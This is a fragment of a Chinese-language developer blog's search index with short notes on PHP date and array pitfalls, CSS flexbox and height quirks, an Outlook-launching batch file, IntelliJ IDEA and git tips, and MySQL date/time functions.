","date":"2018-07-02","objectID":"/blog/posts/%E4%B8%8D%E7%95%99%E9%80%99%E6%AC%A1Linux-bash-%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84%E7%9A%84%E6%96%B9%E6%B3%95/:0:0","tags":["linux","bash","history"],"title":"不留這次Linux bash 歷史記錄的方法","uri":"/blog/posts/%E4%B8%8D%E7%95%99%E9%80%99%E6%AC%A1Linux-bash-%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"[PHP] date跳坑記 今天程式出個bug，竟然提早12小時商品下架 我以為m是分鐘，h是小時 i是分鐘，H是小時(24小時制) h是12小時制 看了一下程式邏輯好像都沒有問題 最後找到原因!!! 錯誤code date(\"Y-m-d h:m:s\",strtotime(\"+7 days\")); ","date":"2018-07-02","objectID":"/blog/posts/PHP-date%E8%B7%B3%E5%9D%91%E8%A8%98/:1:0","tags":["PHP","date"],"title":"[PHP] date跳坑記","uri":"/blog/posts/PHP-date%E8%B7%B3%E5%9D%91%E8%A8%98/"},{"categories":["PHP"],"content":"正確寫法 date(\"Y-m-d H:i:s\"); d 月份中的第几天，有前导零的 2 位数字 01 到 31 D 星期中的第几天，文本表示，3 个字母 Mon 到 Sun m 数字表示的月份，有前导零 01 到 12 M 三个字母缩写表示的月份 Jan 到 Dec n 数字表示的月份，没有前导零 1 到 12 t 指定的月份有几天 28 到 31 Y 4 位数字完整表示的年份 例如：1999 或 2003 y 2 位数字表示的年份 例如：99 或 03 a 小写的上午和下午值 am 或 pm A 大写的上午和下午值 AM 或 PM g 小时，12 小时格式，没有前导零 1 到 12 G 小时，24 小时格式，没有前导零 0 到 23 h 小时，12 小时格式，有前导零 01 到 12 H 小时，24 小时格式，有前导零 00 到 23 i 有前导零的分钟数 00 到 59\u003e s 秒数，有前导零 00 到 59\u003e ","date":"2018-07-02","objectID":"/blog/posts/PHP-date%E8%B7%B3%E5%9D%91%E8%A8%98/:2:0","tags":["PHP","date"],"title":"[PHP] date跳坑記","uri":"/blog/posts/PHP-date%E8%B7%B3%E5%9D%91%E8%A8%98/"},{"categories":["CSS"],"content":"今天踩雷，想用CSS控制class第以個做操控 nth-of-type 跟nth-child nth-of-type是找 第幾個子元素 nth-child是找位置(位置是指所有元素) 不能抓.aaa:first-of-type不能正常跑 只能對html元素 不能對class 這個雷不要再踩到!!! ","date":"2018-07-02","objectID":"/blog/posts/nth-of-type%E4%B8%8D%E8%83%BD%E7%94%A8%E5%9C%A8class-selector/:0:0","tags":["css","nth-of-type","nth-child"],"title":"nth-of-type不能用在class selector","uri":"/blog/posts/nth-of-type%E4%B8%8D%E8%83%BD%E7%94%A8%E5%9C%A8class-selector/"},{"categories":["HTML"],"content":"最近剛好網路爬文看到這個 不過…，我相信不知道這個很容易踩雷 就先記錄一下 Phrasing 所有可以放在p标签内，构成段落内容的元素均属于Phrasing元素。因此，所有Phrasing元素均属于Flow元素。在HTML5标准文档中，关于Phrasing元素的原始定义为： Phrasing content is the text of the document, as well as elements that mark up that text at the intra-paragraph level. Runs of phrasing content form paragraphs. 对于这一定义，个人认为不应当使用“text”这一容易引起误解的词，事实上，一个元素即使不是文本，只要能包含在p标签中成为段落内容的一部分，就可以称之为Phrasing元素。比如：audio、video、img、select、input等元素(经测试，这些元素都可以放置在p标签中)。一个不太精确的类比是：HTML5中的Phrasing元素大致就是HTML4中所定义的inline元素。 Phrasing元素内部一般只能包含别的Phrasing元素。 簡單講就是p元素裡面不能隨意插進一些元素 Phrasing content defines the text and the mark-up it contains. Runs of phrasing content make up paragraphs. Elements belonging to this category are \u003cabbr\u003e, \u003caudio\u003e, \u003cb\u003e, \u003cbdo\u003e, \u003cbr\u003e, \u003cbutton\u003e, \u003ccanvas\u003e, \u003ccite\u003e, \u003ccode\u003e, \u003ccommand\u003e, \u003cdata\u003e, \u003cdatalist\u003e, \u003cdfn\u003e, \u003cem\u003e, \u003cembed\u003e, \u003ci\u003e, \u003ciframe\u003e, \u003cimg\u003e, \u003cinput\u003e, \u003ckbd\u003e, \u003ckeygen\u003e, \u003clabel\u003e, \u003cmark\u003e, \u003cmath\u003e, \u003cmeter\u003e, \u003cnoscript\u003e, \u003cobject\u003e, \u003coutput\u003e, \u003cprogress\u003e, \u003cq\u003e, \u003cruby\u003e, \u003csamp\u003e, \u003cscript\u003e, \u003cselect\u003e, \u003csmall\u003e, \u003cspan\u003e, \u003cstrong\u003e, \u003csub\u003e, \u003csup\u003e, \u003csvg\u003e, \u003ctextarea\u003e, \u003ctime\u003e, \u003cvar\u003e, \u003cvideo\u003e, \u003cwbr\u003e and plain text (not only consisting of white spaces characters). 看開發工具，除了排版變怪了，你會看到開發工具有兩個\u003cp\u003e\u003c/p\u003e，最後一個格式還跑掉 HTML Standard W3C HTML5标准阅读笔记 – 元素分类与内容模型(Content Model) ","date":"2018-06-24","objectID":"/blog/posts/HTML-p-Phrasing%E5%85%83%E7%B4%A0-%E6%94%BE%E5%85%A5div%E6%88%96block%E5%85%83%E7%B4%A0%E6%9C%83%E5%88%86%E5%89%B2%E6%88%90%E5%85%A9%E5%A1%8A/:0:0","tags":["HTML","p","phrasing"],"title":"[HTML]\u003cp\u003e(Phrasing元素)放入div或block元素會分割成兩塊","uri":"/blog/posts/HTML-p-Phrasing%E5%85%83%E7%B4%A0-%E6%94%BE%E5%85%A5div%E6%88%96block%E5%85%83%E7%B4%A0%E6%9C%83%E5%88%86%E5%89%B2%E6%88%90%E5%85%A9%E5%A1%8A/"},{"categories":["CSS"],"content":"父flex 子height:100%; 竟然不會延展 不過flex 好像不用設定height:100%就會延展(default:stretch) 同樣div父層設定min-height:100px; div子層height:100%; 不會變大，可在子層設定min-height:inherit CSS中height:100%和height:inherit的异同 « 张鑫旭-鑫空间-鑫生活 在她裡面，我瞬間背起來單字了 這個背法還真好背，哈哈 ","date":"2018-06-24","objectID":"/blog/posts/CSS-%E4%B8%8A%E5%B1%A4%E6%9C%89%E8%A8%ADmin-height%E4%B9%9F%E6%B2%92%E7%94%A8height-100-%E7%AB%9F%E7%84%B6%E7%84%A1%E6%95%88/:0:0","tags":["css","min-height","height"],"title":"[CSS]上層有設min-height也沒用，height:100%竟然無效??","uri":"/blog/posts/CSS-%E4%B8%8A%E5%B1%A4%E6%9C%89%E8%A8%ADmin-height%E4%B9%9F%E6%B2%92%E7%94%A8height-100-%E7%AB%9F%E7%84%B6%E7%84%A1%E6%95%88/"},{"categories":["CSS"],"content":"解法 不過還是有找到解法，設定父position:relative和子position:absolute，父不用設定height就可以讓子height:100%，是不是很神奇?!! 2018-07-08 今天做week5 前端修練時光屋發現我有一個高度怪怪的(是用position:absolute) 有加到padding-top:20 後來查了一下 left + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = 包含块宽度 預設position:static的高度是算 content-box 沒有padding跟margin 所以可能用absolute跟relative要注意一下他常寬的算法，可能會踩到雷XD Your CSS means that the child element’s height is 100% of the specified height of the parent element. If you do not specify a height for the parent, then the 100% doesn’t mean anything. Hence it doesn’t work. What you want can be achieved by using position:relative on the parent and position:absolute on the child: http://jsfiddle.net/57EZn/25/ It’s not a beautiful solution but it does what you are after. html - CSS 100% height of container with min-height - Stack Overflow 关于height：100%无效的解决办法与细节 - CSDN博客 从height:100%不支持聊聊CSS中的“死循环” « 张鑫旭-鑫空间-鑫生活 CSS中height:100%和height:inherit的异同 « 张鑫旭-鑫空间-鑫生活 JavaScript中的Date对象，以及UTC、GMT、时区的关系 | xtutu ","date":"2018-06-24","objectID":"/blog/posts/CSS-%E4%B8%8A%E5%B1%A4%E6%9C%89%E8%A8%ADmin-height%E4%B9%9F%E6%B2%92%E7%94%A8height-100-%E7%AB%9F%E7%84%B6%E7%84%A1%E6%95%88/:0:1","tags":["css","min-height","height"],"title":"[CSS]上層有設min-height也沒用，height:100%竟然無效??","uri":"/blog/posts/CSS-%E4%B8%8A%E5%B1%A4%E6%9C%89%E8%A8%ADmin-height%E4%B9%9F%E6%B2%92%E7%94%A8height-100-%E7%AB%9F%E7%84%B6%E7%84%A1%E6%95%88/"},{"categories":["PHP"],"content":"今天無聊試著用array比較 發現竟然var_dump東西竟然是true 依我印象中Java、JavaScript都不能直接做array比較 但是php竟然可以…. 太神奇了 $a = array(array('a','b')); $b = array(array('a','b')); var_dump($a == $b ); array也可以用+法，但是+到對印的value還是以左邊為主(本身) 其實自己測試會比較清楚 The + operator returns the right-hand array appended to the left-hand array; for keys that exist in both arrays, the elements from the left-hand array will be used, and the matching elements from the right-hand array will be ignored. \u003c?php $a = array(\"a\" =\u003e \"apple\", \"b\" =\u003e \"banana\"); $b = array(\"a\" =\u003e \"pear\", \"b\" =\u003e \"strawberry\", \"c\" =\u003e \"cherry\"); $c = $a + $b; // Union of $a and $b echo \"Union of \\$a and \\$b: \\n\"; var_dump($c); $c = $b + $a; // Union of $b and $a echo \"Union of \\$b and \\$a: \\n\"; var_dump($c); $a += $b; // Union of $a += $b is $a and $b echo \"Union of \\$a += \\$b: \\n\"; var_dump($a); ?\u003e Union of $a and $b: array(3) { [“a”]=\u003e string(5) “apple” [“b”]=\u003e string(6) “banana” [“c”]=\u003e string(6) “cherry” } Union of $b and $a: array(3) { [“a”]=\u003e string(4) “pear” [“b”]=\u003e string(10) “strawberry” [“c”]=\u003e string(6) “cherry” } Union of $a += $b: array(3) { ‘a’ =\u003e string(5) “apple” ‘b’ =\u003e string(6) “banana” ‘c’ =\u003e string(6) “cherry” } array比較 === 跟 ==差別 在於===會檢查key順序 $a = array (0 =\u003e \"apple\", 1 =\u003e \"banana\"); $b = array (1 =\u003e \"banana\", 0 =\u003e \"apple\"); var_dump($a === $b); // prints bool(false) as well $b = array (\"0\" =\u003e \"apple\", \"1\" =\u003e \"banana\"); var_dump($a === $b); // prints bool(true) $b = array (\"0\" =\u003e \"apple-1\", \"1\" =\u003e \"banana-1\"); var_dump($a === $b); // prints bool(false) PHP: Array Operators - Manual PHP - Check if two arrays are equal - Stack Overflow PHP 三十天就上手-Day -17 Array Operators - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2018-06-24","objectID":"/blog/posts/php%E5%8F%AF%E4%BB%A5%E5%81%9A%E9%99%A3%E5%88%97%E6%AF%94%E8%BC%83/:0:0","tags":["php","array"],"title":"php可以做陣列比較","uri":"/blog/posts/php%E5%8F%AF%E4%BB%A5%E5%81%9A%E9%99%A3%E5%88%97%E6%AF%94%E8%BC%83/"},{"categories":["寫程式一些事"],"content":"現在工作每天都要寫工作進度 有時候小小一個動作 可以省很多時間做調整 這個bat是網路找的… REM 取得今天的年、月、日 (自動補零) SET TodayYear=%date:~2,2% SET TodayMonthP0=%date:~5,2% SET TodayDayP0=%date:~8,2% REM 取得今天的年、月、日 (純數字) REM 2010/08/03 更新：以下是為了修正 Batch 遇到 08, 09 會視為八進位的問題 IF %TodayMonthP0:~0,1% == 0 ( SET /A TodayMonth=%TodayMonthP0:~1,1%+0 ) ELSE ( SET /A TodayMonth=TodayMonthP0+0 ) IF %TodayMonthP0:~0,1% == 0 ( SET /A TodayDay=%TodayDayP0:~1,1%+0 ) ELSE ( SET /A TodayDay=TodayDayP0+0 ) echo 日期 %TodayYear%/%TodayMonthP0%/%TodayDayP0% pause \"C:\\Program Files (x86)\\Microsoft Office\\Office12\\outlook.exe\" /c ipm.note /m \"mailto:'xxxxx'\u003cooooooo\u003e;'xxxxx' \u003coooooo\u003e;\u0026subject=ZeYi-%TodayYear%%TodayMonthP0%%TodayDayP0% 工作回報\u0026body=Dear all:\" 參考來源： The Will Will Web | 如何在 Batch 檔取得系統的日期、時間欄位 (第三版) How to create an Outlook new email with specified command line? ","date":"2018-06-24","objectID":"/blog/posts/outlook%E8%87%AA%E5%8B%95%E9%96%8B%E5%95%9F%E6%96%B0%E4%BF%A1%E4%BB%B6/:0:0","tags":["outlook","自動化"],"title":"outlook自動開啟新信件","uri":"/blog/posts/outlook%E8%87%AA%E5%8B%95%E9%96%8B%E5%95%9F%E6%96%B0%E4%BF%A1%E4%BB%B6/"},{"categories":["PHP"],"content":"最近跟同事看smarty，覺得怪怪…. display(basename(‘xxxx.php’,php)); 後來參發現basename第二個參數不會帶.php 真的 點點點… 不熟這個function，一眼真的會猜錯… 這種小雷希望不要再採到 //顯示帶有文件擴展名的文件名 echo basename($path); //顯示不帶有文件擴展名的文件名 echo basename($path,\".php\"); ","date":"2018-06-24","objectID":"/blog/posts/PHP-basename%E6%8E%A1%E9%9B%B7%E8%A8%98/:0:0","tags":["basename","php","filepath"],"title":"[PHP]basename採雷記","uri":"/blog/posts/PHP-basename%E6%8E%A1%E9%9B%B7%E8%A8%98/"},{"categories":["CSS"],"content":"flex-direction: column/column-reverse row row-reverse (預設row) ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:1:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"flex-wrap: wrap nowrap wrap-reverse (default: nowrap) 常忘記有wrap-reverse Flexbox Froggy - A game for learning CSS flexbox 最後一關會用到他(我卡很久在那邊) ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:2:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"flex-flow: flex-direction flex-wrap; main axis是主軸線 cross axis是副軸線 我覺得上面兩個名詞要搞懂會比較好了解 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:3:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"justify-content 參考flex-direction主軸線 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:4:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"align-content(default:stretch) 用在多行 單行可能沒做用 交錯軸上下 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:5:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"align-items(default:stretch)，有baseline 這兩個常常搞錯 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:6:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"※踩雷筆記 當flex裡面元素沒有設定高度，預設為height:auto的話，stretch會延展高度100% 相反沒有的話，看內文的寬度，ex:\u003cdiv\u003e\u003c/div\u003e內文沒有高度和文字，但不限顯示出來，除非打字就會有東西 align-items和align-content公用看起來很像，裡面有詳細介紹 flex布局中align-items 和align-content的区别 - CSDN博客 align-content - CSS：层叠样式表 | MDN ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:6:1","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"width flex等於由下面屬性和成 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:7:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"flex-grow: (default:0)預設不會延展 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:7:1","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"flex-shrik:(default:1)預設會縮小 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:7:2","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"flex-basis:(default:auto) 依照副軸線對應width或height，長度優先權最高 flex-item的flex-basis与width属性有什么关系？ - 额，前端 - SegmentFault 思否 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:7:3","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"小雷注意 如果沒設定flex-basis長度的話(有設定width)，flex-shrik不會把元素縮小…. 看來flex-shrik都是依照flex-basis長度縮放為主 可實作看看會很清楚 JS Bin - JS Bin 如果同时设置flex-basis和width，那么width属性会被覆盖，也就是说flex-basis的优先级比width高。有一点需要注意，如果flex-basis和width其中有一个是auto，那么另外一个非auto的属性优先级会更高。 深入理解css3中的flex-grow、flex-shrink、flex-basis 有公式 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:7:4","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["CSS"],"content":"心得 其實我覺得flex精華都在flex-grow跟flex-shrik上面，其實我之前就有去了解flex 有玩過Flexbox Froggy遊戲…，但對排版印用不是很了解 flex-shrik預設竟然是1，會自動縮放，但是flex-grow預設是0 也就是說在不預設定flex屬性時候 裡面原素預設不會放大，但也不會超過父層寬度 這用在響印式設計真的還不錯 常常看到很多用flex:1，會自動擴大 我一直以為每個元素都要設定flex，但其實不用 備註 flex:1 只會影響flex-grow 可惡…被padding跟margin影響了XD 影片教學可參考 (1) 卡斯伯 - 20:30 直播 CSS Flex 來試試看 Flex 吧 看看這東西到底是怎麼算的 😆 今天沒有 ZOOM 頻道 ","date":"2018-06-08","objectID":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/:8:0","tags":["CSS","flex"],"title":"CSS flex常忘記筆記","uri":"/blog/posts/CSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98/"},{"categories":["編輯器"],"content":"最近使用IntelliJ IDEA看程式，目前使用裝進去發現沒有自動移置定義功能 Google找一下，發現不能直接開資料夾 要用import方式開啟檔案 IntelliJ IDEA Cannot find declaration to go to - 请叫我头头哥 - 博客园 Intellij IDEA ，按Ctrl+左键，不能进入类或方法的【解决办法】，提示Cannot find declaration to go to - CSDN博客 ","date":"2018-06-03","objectID":"/blog/posts/JAVA-IntelliJ-IDEA-Cannot-find-declaration-to-go-to/:0:0","tags":["Java","IntelliJ IDEA"],"title":"[JAVA]IntelliJ IDEA Cannot find declaration to go to","uri":"/blog/posts/JAVA-IntelliJ-IDEA-Cannot-find-declaration-to-go-to/"},{"categories":["編輯器"],"content":"最近因為專案要從IntelliJ IDEA看JAVA程式 原本用Visual Studio Code追code太累了 最後受不了裝了IntelliJ IDEA 發現他會自動存檔…. 當然這個要解決 但在如何完全禁用 IDEA 的自动保存功能 - V2EX 很多人都不建議關掉 大多數很多人都說自動存檔是IntelliJ IDEA特色 要還原那直接用git還原… 不過我那個專案沒有GIT 所以還是看情況吧 參考來源: intellij 关闭自动保存和标志修改文件为星号 - CSDN博客 Blog of Bruce: IntelliJ IDEA 設定 Intellij IDEA Java类不保存时自动编译 - 代码日志 ","date":"2018-06-03","objectID":"/blog/posts/IntelliJ-IDEA-%E9%97%9C%E9%96%89%E8%87%AA%E5%8B%95%E5%AD%98%E6%AA%94/:0:0","tags":["自動存檔","IDEA","IntelliJ"],"title":"IntelliJ IDEA 關閉自動存檔","uri":"/blog/posts/IntelliJ-IDEA-%E9%97%9C%E9%96%89%E8%87%AA%E5%8B%95%E5%AD%98%E6%AA%94/"},{"categories":["Git"],"content":"之前副理叫我push上去他加入的gitlab空repo 我push竟然跑出fatal: refusing to merge unrelated histories 好在Google一下有找到答案 git pull origin master --allow-unrelated-histories 不過後來有想到一個方法 就是直接下載那個git clone 然後copy檔案到那個clone下來就直接commit 但這缺點就不法把之前所有commit帶進去 看來還是用Google找的方法 參考來源 第 24 天：使用 GitHub 遠端儲存庫 - 入門篇 – 範例照打無法成功 · Issue #31 · doggy8088/Learn-Git-in-30-days · GitHub git push - Git: which is the default configured remote for branch? - Stack Overflow 解决Git refusing to merge unrelated histories问题 | Doublemine ","date":"2018-06-02","objectID":"/blog/posts/git%E5%90%8C%E6%AD%A5%E5%88%86%E6%94%AF%E8%A1%9D%E7%AA%81%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:0:0","tags":["git"],"title":"git同步分支衝突解決方法","uri":"/blog/posts/git%E5%90%8C%E6%AD%A5%E5%88%86%E6%94%AF%E8%A1%9D%E7%AA%81%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"平常用到時間運算，假如能在SQL撈到想要的資料 這樣程式可以寫得少，速度也跟者快… 但是偏偏MySQL時間運算不太熟 在此網路找一些，寫筆記…. MySQL :: MySQL 5.5 Reference Manual :: 12.7 Date and Time Functions UNIX_TIMESTAMP()可以用between…and做比較 mysql - UNIX_TIMESTAMP() comparison - Stack Overflow ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:0","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"UNIX_TIMESTAMP()\u003c==\u003eFROM_UNIXTIME() UNIX_TIMESTAMP()產生UNIX時間戳記 FROM_UNIXTIME()轉一般時間標記(xxxx-xx-xx oo:oo:oo) ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:1","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"DATEDIFF(‘2015-09-28 21:00:01’,‘2015-08-31 13:00:01’); 算出差幾天 帶進去參數不一定要DATETIME格式 UNIX_TIMESTAMP也可以 ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:2","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"TIMEDIFF(‘2015-09-28 21:00:01’,‘2015-09-28 13:23:11’) 算出差幾秒，傳回時間格式(datetime) php - MySQL: how to get the difference between two timestamps in seconds - Stack Overflow 不同於一般DB2和Oracle資料庫用法 MySQL Tryit Editor v1.0 可用MySQL函式,day(),month()….來做判斷幾天或幾個月 使用MySQL時間函數(function)轉換UNIX時間戳記與時間加減 @ 史丹利愛碎念 :: 痞客邦 :: ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:3","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"TIMESTAMPDIFF(DAY,‘2015-09-28 21:00:01’,‘2015-09-28 13:23:11’) php - mysql timediff to hours - Stack Overflow ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:4","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"to_days\u003c=\u003efrom_days to_days()傳回天數數字 +1就是加1天 看範例比較快 糯米玩PC: MySql 按日期進行統計 TO_DAYS日期函数 - 我的地盘 - ITeye博客 SELECT from_days(to_days(now())+1); MySQL Tryit Editor v1.0 直接試比較快懂，我爬了很久 以為是UNIX_TIMESTAMP….但不是 ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:5","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"time_to_sec\u003c=\u003esec_to_time 用時間格式轉乘秒，可以超過24小時 (感覺能用在UNIX_TIMESTAMP運算上面) MySQL TIME_TO_SEC() Function MySQL日期時間函數大全 @ 資訊園 :: 痞客邦 :: sql - Compare dates in MySQL - Stack Overflow MYSQL时间函数 - 简书 mysql - SELECT row by DATEPART() - Stack Overflow ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:6","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"MySQL跟DB2 差異寫法 回憶以前用db2的時候 项目中用到过的MYSQ和DB2的部分函数转化 （zxz）_MySQL_第七城市 https://hackmd.io/iQcvSsh_Td6T6oxDjwWXew?view 備份用… MySQL :: MySQL 5.5 Reference Manual :: 12.7 Date and Time Functions ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:7","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"UNIX_TIMESTAMP 時間加法運算 select now() + INTERVAL 5 HOUR now()跟CURRENT_TIMESTAMP是一樣的 很常看到都是用DATETIME型態做運算 datetime運算其實有DATE_ADD和DATE_SUB DATE_ADD和DATE_SUB其實可以通用，因為expr可以為一個負數。 其實很簡單，一個是用加一個是減，不過…DATE_ADD(xxx, - INTERVAL 5 MINUNT) 可以用負數 最後，感覺能用在TIME_TO_SEC用在運算上面 但不知道網路上很少這樣用 ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:8","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["MySQL"],"content":"小心效能 MySQL裡的NOW()與UNIX_TIMESTAMP() date(欄位) = xxx 很吃效能 盡量用 WHERE date \u003e= ‘2010-10-01’ AND date \u003c ‘2010-11-01’ date - Difference between UNIX_TIMESTAMP and NOW() in MySQL - Stack Overflow mysql中日期比较大小的方法 - CSDN博客 MySQL compare DATE string with string from DATETIME field - Stack Overflow MYSQL数据库时间字段INT,TIMESTAMP,DATETIME性能效率比较 datetime - How to optimize date time search in Mysql? - Stack Overflow MySQL中的UNIX_TIMESTAMP函数使用总结 - 曾是土木人 - 博客园 where DATE(time_stamp) = DATE(now()); 用在欄位很吃效能，可能會造成full scan datetime要怎麼比較今天呢?? 這個我相信很常用 有找到這個 WHERE startTime \u003e= '2010-04-29' AND startTime \u003c ('2010-04-29' + INTERVAL 1 DAY) MySQL compare DATE string with string from DATETIME field - Stack Overflow 可以參考上面第二個解答 對非欄位做轉換比較不會吃資源 